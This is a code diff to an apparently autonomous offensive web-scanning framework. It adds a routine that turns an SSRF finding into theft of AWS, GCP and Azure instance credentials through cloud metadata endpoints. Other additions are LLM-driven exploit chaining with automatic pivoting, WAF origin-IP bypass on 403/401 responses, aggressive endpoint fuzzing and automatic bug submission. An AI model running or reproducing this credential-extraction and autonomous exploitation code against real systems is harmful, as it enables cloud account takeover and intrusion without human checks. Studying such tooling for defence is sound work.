@@ -44,7 +44,7 @@ from aura.modules.logic_hunter import LogicHunter
 from aura.modules.xxe_engine import XXEEngine
 from aura.modules.prototype_pollution_engine import PrototypePollutionEngine
 from aura.modules.dom_hunter import DOMHunter
-from aura.modules.graphql_engine import GraphQLEngine
+from aura.modules.graphql_engine import GraphQLBreaker
 from aura.modules.mfa_bypass_engine import MFABypassEngine
 from aura.modules.business_logic_engine import BusinessLogicEngine
 from aura.modules.host_header_engine import HostHeaderEngine
@@ -52,7 +52,7 @@ from aura.modules.open_redirect_engine import OpenRedirectEngine
 from aura.modules.file_upload_engine import FileUploadEngine
 from aura.modules.deserialize_engine import DeserializationEngine
 from aura.modules.ws_oauth_engine import WSAndOAuthEngine
-from aura.modules.ssti_engine import SSTIEngine
+from aura.modules.ssti_engine import SSTIReaper
 from aura.modules.smuggling_engine import SmugglingEngine
 from aura.modules.exploit_radar import ExploitRadar
 from aura.modules.dorks_intel import DorksIntel
@@ -186,6 +186,10 @@ class SovereignDecisionEngine:
         console.print(f"[bold purple][👑] Decision: Primary Objective set to: {selected[0]}[/bold purple]")
         return selected
 
+from aura.modules.api_reaper import APIReaper
+from aura.modules.frontend_deconstructor import FrontendDeconstructor
+from aura.modules.graphql_reaper import GraphQLReaper
+
 from aura.core.zenith_reporter import ZenithReporter
 
 class NeuralOrchestrator:
@@ -193,6 +197,9 @@ class NeuralOrchestrator:
         AuraProvisioner.check_and_provision()
         self.brain = AuraBrain()
         self.db = AsyncDBProxy(AuraStorage())
+        self.api_reaper = APIReaper(None) # Session will be assigned later
+        self.frontend_miner = FrontendDeconstructor(None)
+        self.gql_reaper = GraphQLReaper(None)
         self.cot = ChainOfThoughtExploiter(self.brain)
         self.memory = DeepMemoryFuzzer(self.db)
         self.stealth = StealthEngine()
@@ -255,6 +262,11 @@ class NeuralOrchestrator:
             self.knowledge_base["redirects"].append(content_obj.get("evidence_url"))
         elif "ssrf" in str(finding_type).lower() or "lfi" in str(finding_type).lower():
             self.knowledge_base["sinks"].append(content_obj.get("evidence_url"))
+            
+            # v38.0: Cloud Metadata Predator - Autonomous Escalation
+            if "169.254.169.254" in str(content_obj.get("payload", "")) or "metadata" in str(content_obj.get("payload", "")):
+                await self._cloud_metadata_escalation(domain, content_obj)
+                
         elif "idor" in str(finding_type).lower():
             self.knowledge_base["idor_vectors"].append(content_obj.get("evidence_url"))
         if self.knowledge_base["redirects"] and self.knowledge_base["sinks"]:
@@ -273,7 +285,127 @@ class NeuralOrchestrator:
             return chain_finding
         if any(k in str(finding_type).lower() for k in ["ssrf", "rce", "lfi"]):
             await self.lateral.pivot_from_finding(content_obj)
+        
+        # v38.0 OMEGA: Sentient Oracle Synthesis for Chaining
+        await self._perform_oracle_chaining_synthesis(domain)
+        
         return None
+
+    async def _cloud_metadata_escalation(self, domain: str, finding: dict):
+        """
+        [CLOUD PREDATOR] v38.0: Autonomous IAM Credential Extraction.
+        Pivots from SSRF to full metadata harvest (AWS/GCP/Azure).
+        """
+        console.print(f"[bold red][🛰️ CLOUD PREDATOR] SSRF Detected on Cloud Infrastructure. Pivoting to IAM Escalation...[/bold red]")
+        
+        target_url = finding.get("url")
+        param = finding.get("param")
+        if not target_url or not param: return
+        
+        # Metadata targets for extraction
+        escalation_targets = [
+            ("AWS IAM Role", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+            ("AWS User Data", "http://169.254.169.254/latest/user-data"),
+            ("GCP Service Account", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
+            ("Azure Identity", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/")
+        ]
+        
+        for name, meta_url in escalation_targets:
+            console.print(f"[dim yellow][*] Attempting to extract {name}...[/dim yellow]")
+            
+            # Construct the escalation request
+            from urllib.parse import urlparse, parse_qs, urlencode
+            parsed = urlparse(target_url)
+            qs = parse_qs(parsed.query)
+            qs[param] = [meta_url]
+            new_url = parsed._replace(query=urlencode(qs, doseq=True)).geturl()
+            
+            try:
+                # Add Metadata-Flavor header for GCP/Azure
+                headers = {"Metadata-Flavor": "Google", "Metadata": "true"}
+                resp = await self.session.get(new_url, headers=headers)
+                
+                if resp and resp.status_code == 200:
+                    # If AWS IAM, we need to fetch the role name first, then the creds
+                    if "iam/security-credentials/" in meta_url and not resp.text.strip().startswith("{"):
+                        role_name = resp.text.strip()
+                        meta_url += role_name
+                        qs[param] = [meta_url]
+                        new_url = parsed._replace(query=urlencode(qs, doseq=True)).geturl()
+                        resp = await self.session.get(new_url, headers=headers)
+                    
+                    if resp and "AccessKeyId" in resp.text or "access_token" in resp.text:
+                        console.print(f"[bold red][🔥 CLOUD TAKEOVER] SUCCESS: Extracted {name} Credentials![/bold red]")
+                        takeover_finding = {
+                            "type": f"Cloud Infrastructure Takeover: {name} Leak",
+                            "severity": "CRITICAL",
+                            "content": f"Successfully extracted sensitive cloud credentials via SSRF: {resp.text[:200]}...",
+                            "evidence_url": new_url,
+                            "confirmed": True
+                        }
+                        self.db.add_finding(domain, takeover_finding, takeover_finding["type"], "CRITICAL")
+            except Exception as e:
+                logger.debug(f"Cloud escalation failed for {name}: {e}")
+
+    async def _perform_oracle_chaining_synthesis(self, domain: str):
+        """v38.0 OMEGA: Feed minor findings to Brain for critical chaining discovery."""
+        campaign_id = getattr(self, 'current_campaign', None)
+        
+        # Collect recent minor findings from DB or local state
+        # For simplicity in this implementation, we'll summarize findings from the current session
+        # In a real scenario, this would query the DB for all LOW/INFO findings.
+        
+        summary_prompt = f"""
+        Analysis for domain: {domain}
+        Recent Findings: {json.dumps(self.knowledge_base)}
+        
+        Perform 'Oracle Synthesis': Determine if these minor (INFO/LOW/MEDIUM) findings can be chained together 
+        to achieve a CRITICAL impact (e.g., SSRF + Internal Host discovery = Internal API Access).
+        
+        If a chain is possible, describe it and provide the 'chained_payload'.
+        Format: json object with 'chain_name', 'logic', 'severity', 'chained_payload'.
+        Return null if no viable chain is found.
+        """
+        
+        try:
+            raw = await asyncio.to_thread(self.brain.reason_json, summary_prompt)
+            chain = json.loads(raw) if isinstance(raw, str) else raw
+            
+            if chain and chain.get("chained_payload"):
+                console.print(f"[bold red][🔮 ORACLE] Sentient Discovery: {chain.get('chain_name')}![/bold red]")
+                console.print(f"[dim red]Logic: {chain.get('logic')}[/dim red]")
+                
+                chain_finding = {
+                    "type": f"Sentient Chain: {chain.get('chain_name')}",
+                    "content": chain.get("logic"),
+                    "evidence_url": chain.get("chained_payload"),
+                    "severity": chain.get("severity", "CRITICAL")
+                }
+                
+                self.db.add_finding(domain, chain_finding, chain_finding["type"], chain_finding["severity"], campaign_id)
+                
+                # Autonomously pivot to the new mission
+                console.print(f"[bold purple][🚀] Autonomous Pivot: Launching targeted mission for {chain.get('chained_payload')}...[/bold purple]")
+                await self.lateral.pivot_from_finding(chain_finding)
+                
+        except Exception as e:
+            logger.debug(f"Oracle Synthesis failed: {e}")
+
+    async def _desperation_maneuver(self, targets: list[str]) -> list[str]:
+        """v38.0: Aggressive forensic fuzzing for targets with hidden API surfaces."""
+        all_new = set()
+        for t in targets:
+            # Trigger the scanner in 'Aggressive' mode
+            new_paths = await self.scanner.force_fuzz(t, swarm_mode=True)
+            all_new.update(new_paths)
+            # Add common SPA routes manually as a safety net
+            SPA_ROUTES = [
+                "/rest/user/login", "/api/v1/user", "/rest/products/search",
+                "/admin", "/api/v1/config", "/graphql", "/api/v1/status"
+            ]
+            for r in SPA_ROUTES:
+                all_new.add(urljoin(t, r))
+        return list(all_new)
 
     async def _memory_watchdog(self):
         try:
@@ -338,13 +470,15 @@ class NeuralOrchestrator:
             console.print(f"[dim red][!] Shutdown warning: {e}[/dim red]")
 
     async def _phase_preflight(self, domain, status):
-        status.update(f"[bold cyan][⚡] Phase 0: Stealth Pre-Flight Recon on {domain}...")
+        ZenithUI.phase_banner("Phase 0: Stealth Pre-Flight Recon", domain, icon="⚡")
+        status.update(f"[bold cyan]Initializing pre-flight telemetry for {domain}...")
         target_url = f"https://{domain}"
         original_domain = domain
         try:
             resp = await self.session.get(target_url, timeout=30)
             is_live = True
-            if resp and resp.status_code in [403, 400] and "cloudflare" in resp.headers.get("server", "").lower():
+            recon_domain = domain
+            if state.SMART_BYPASS and resp.status_code in [403, 401]:
                 origin_ips = await self.stealth.hunt_origin_ip(domain)
                 if origin_ips:
                     best_ip = origin_ips[0]
@@ -363,7 +497,8 @@ class NeuralOrchestrator:
         return domain, target_url, original_domain, is_live
 
     async def _phase_intel(self, recon_domain, target_ip, status, campaign_id):
-        status.update(f"[bold magenta][📡] Phase 1: Gathering OSINT for {recon_domain}...")
+        ZenithUI.phase_banner("Phase 1: Gathering OSINT", recon_domain, icon="📡")
+        status.update(f"[bold magenta]Querying threat intelligence databases...")
         intel_data = {}
         async def _shodan():
             try: return "shodan", await self.intel.query_shodan(target_ip) if target_ip else None
@@ -374,24 +509,99 @@ class NeuralOrchestrator:
         return intel_data
 
     async def _phase_recon(self, recon_domain, target_ip, intel_data, status, campaign_id, swarm_mode):
-        status.update(f"[bold blue][🛰️] Phase 2: Recon for {recon_domain}...")
+        ZenithUI.phase_banner("Phase 2: Active Reconnaissance", recon_domain, icon="🛰️")
+        status.update(f"[bold blue]Mapping infrastructure and subdomains...")
         recon_data = await self.recon_pipeline.run(recon_domain, target_ip, intel_data=intel_data, stealth_mode=self.effective_fast_mode)
         all_subs = recon_data.get("subdomains", [])
         if all_subs: await self.takeover_hunter.run(all_subs)
         return recon_data
 
     async def _phase_discovery(self, target_url, recon_domain, recon_data, status, campaign_id):
-        status.update(f"[bold yellow][🔍] Phase 3: Discovery on {target_url}...")
+        ZenithUI.phase_banner("Phase 3: Deep Discovery", target_url, icon="🔍")
+        status.update(f"[bold yellow]Crawling and discovering endpoints...")
         spidered_urls, discovered_forms = await self.scanner.recursive_spider(target_url, max_depth=1)
         return list(set([target_url] + spidered_urls)), discovered_forms
 
+    async def _phase_deconstruction(self, target_url, recon_domain, recon_data, status, campaign_id):
+        ZenithUI.phase_banner("Phase 3.5: Deconstruction Doctrine", target_url, icon="🏗️")
+        status.update(f"[bold blue]Dissecting frontend and APIs...")
+        all_findings = []
+        endpoints_to_fuzz = []
+        
+        # 1. Webpack Unpacker (Frontend Deconstructor)
+        try:
+            from aura.modules.frontend_deconstructor import FrontendDeconstructor
+            webpack_engine = FrontendDeconstructor(target=target_url)
+            webpack_findings = await webpack_engine.run()
+            all_findings.extend(webpack_findings)
+            hidden_routes = [f["value"] for f in webpack_findings if "Endpoint" in f.get("type", "")]
+            for r in hidden_routes:
+                endpoints_to_fuzz.append({
+                    "method": "GET", 
+                    "path": r, 
+                    "fuzz_params": ["id", "q", "page"], 
+                    "fuzz_types": ["sqli", "xss", "path_traversal", "ssrf"]
+                })
+        except Exception as e:
+            hidden_routes = []
+            console.print(f"[dim red]Webpack Unpacker error: {e}[/dim red]")
+
+        # 2. API Reaper
+        try:
+            from aura.modules.api_reaper import APIReaper
+            # Pass hidden_routes to the API Reaper
+            api_engine = APIReaper(target=target_url, discovered_endpoints=hidden_routes)
+            api_findings = await api_engine.run()
+            all_findings.extend(api_findings)
+            for ep in getattr(api_engine, 'endpoints', []):
+                params_dict = {p["name"]: 1 for p in ep.get("params", []) if p["in"] == "query"}
+                fuzz_param_names = list(params_dict.keys())
+                if fuzz_param_names or ep.get("body_schema"):
+                    endpoints_to_fuzz.append({
+                        "method": ep["method"],
+                        "path": ep["path"],
+                        "params": params_dict,
+                        "data": ep.get("body_schema", {}) if isinstance(ep.get("body_schema"), dict) else {},
+                        "fuzz_params": fuzz_param_names,
+                        "fuzz_types": ["sqli", "xss", "path_traversal", "negative", "boolean_toggle"]
+                    })
+        except Exception as e: console.print(f"[dim red]API Reaper error: {e}[/dim red]")
+        except Exception as e: console.print(f"[dim red]Webpack Unpacker error: {e}[/dim red]")
+        
+        # 3. GraphQL Reaper
+        try:
+            from aura.modules.graphql_reaper import GraphQLReaper
+            graphql_engine = GraphQLReaper(target=target_url)
+            graphql_findings = await graphql_engine.run()
+            all_findings.extend(graphql_findings)
+        except Exception as e: console.print(f"[dim red]GraphQL Reaper error: {e}[/dim red]")
+        
+        # Neural-Chain: Feed to StatefulLogicFuzzer
+        if endpoints_to_fuzz:
+            status.update(f"[bold red][⛓️] Neural-Chain: Feeding {len(endpoints_to_fuzz)} precise routes to StatefulLogicFuzzer...")
+            fuzzer = StatefulLogicFuzzer(base_url=target_url)
+            workflow = fuzzer.define_workflow("Deconstruction_Workflow", endpoints_to_fuzz)
+            await fuzzer.execute_workflow(workflow, mutate_only=True)
+            
+            for finding in fuzzer.findings:
+                # Add to findings array
+                f_dict = {"type": finding.vuln_type, "severity": finding.severity, "content": finding.description, "evidence": finding.evidence}
+                all_findings.append(f_dict)
+                self.db.add_finding(recon_domain, f_dict, finding.vuln_type, finding.severity, campaign_id)
+                # Note: Autonomous PoC Generation is already handled by API Reaper and GraphQL reaper natively,
+                # and in phase_exploit for general findings.
+                
+        return all_findings
+
     async def _phase_audit(self, target_url, recon_domain, discovered_urls, status, campaign_id, swarm_mode):
-        status.update(f"[bold red][💥] Phase 4: Audit on {target_url}...")
+        ZenithUI.phase_banner("Phase 4: Deep Security Audit", target_url, icon="💥")
+        status.update(f"[bold red]Firing Nuclei and intelligent payloads...")
         vulns = await self.nuclei_engine.scan(target_url)
         return vulns
 
     async def _phase_exploit(self, recon_domain, vulns, status, campaign_id):
-        status.update(f"[bold purple][🔮] Phase 5: Exploit for {recon_domain}...")
+        ZenithUI.phase_banner("Phase 5: Autonomous Exploitation", recon_domain, icon="🔮")
+        status.update(f"[bold purple]Synthesizing custom exploit chains...")
         await self.execute_exploit_chaining(recon_domain, vulns)
         # Elite Logic: Autonomous PoC Generation for CRITICAL/HIGH Findings
         if vulns:
@@ -409,7 +619,8 @@ class NeuralOrchestrator:
         return vulns
 
     async def _phase_finalize(self, recon_domain, vulns, tech_stack, status, campaign_id):
-        status.update(f"[bold green][🏁] Final Phase for {recon_domain}...")
+        ZenithUI.phase_banner("Phase 6: Mission Finalization", recon_domain, icon="🏁")
+        status.update(f"[bold green]Generating strategic reports and submitting bugs...")
         stack_name = tech_stack[0].split("/")[0] if (isinstance(tech_stack, list) and tech_stack) else "Generic"
         report_paths = await self.reporter.finalize_mission(recon_domain, vulns, tech_stack=stack_name)
         self.db.save_target({"target": recon_domain, "status": "COMPLETED"})
@@ -441,11 +652,16 @@ class NeuralOrchestrator:
                 _t3 = time.time()
                 discovered_urls, discovered_forms = await self._phase_discovery(target_url, recon_domain, recon_data, status, campaign_id)
                 METRICS.phase_duration.labels(phase_name="discovery").observe(time.time() - _t3)
+                
+                _t3_5 = time.time()
+                deconstruction_findings = await self._phase_deconstruction(target_url, recon_domain, recon_data, status, campaign_id)
+                METRICS.phase_duration.labels(phase_name="deconstruction").observe(time.time() - _t3_5)
+                
                 _t4 = time.time()
                 vulns = await self._phase_audit(target_url, recon_domain, discovered_urls, status, campaign_id, swarm_mode)
                 METRICS.phase_duration.labels(phase_name="audit").observe(time.time() - _t4)
                 _t5 = time.time()
-                vulns = await self._phase_exploit(recon_domain, vulns, status, campaign_id)
+                vulns = await self._phase_exploit(recon_domain, vulns + deconstruction_findings, status, campaign_id)
                 METRICS.phase_duration.labels(phase_name="exploit").observe(time.time() - _t5)
                 _t6 = time.time()
                 report_paths = await self._phase_finalize(recon_domain, vulns, recon_data.get("tech_stack"), status, campaign_id)
